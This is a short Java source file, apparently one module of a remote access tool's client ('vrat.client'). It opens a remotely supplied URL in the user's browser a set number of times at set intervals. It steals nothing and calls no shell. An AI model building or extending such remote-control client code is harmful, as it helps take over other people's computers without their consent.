package vrat.client;

import java.awt.*;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;

/*
 * @author vrmg
 */

public class WebBrowser implements Runnable{
	private ArrayList recived;
	
    public WebBrowser(ArrayList recived){
		this.recived = recived; 
    }

	@Override
	public void run(){
		int a = 0;

		while (a < (int) recived.get(2)) {
			try{
				Thread.sleep((int) recived.get(3) * 1000);
			} 
			catch (InterruptedException e){
				e.printStackTrace();
				System.out.println("Error putting thread to sleep");
			}
			
			/*
			* Opens the given website x amount of times, with the given interval
			*/
			try{
				Desktop.getDesktop().browse(new URI((String) recived.get(1)));
			} 
			catch (IOException | URISyntaxException e) {
				e.printStackTrace();
				System.out.println("Error opening web browser");
			}
			a ++;
		}
	}
}
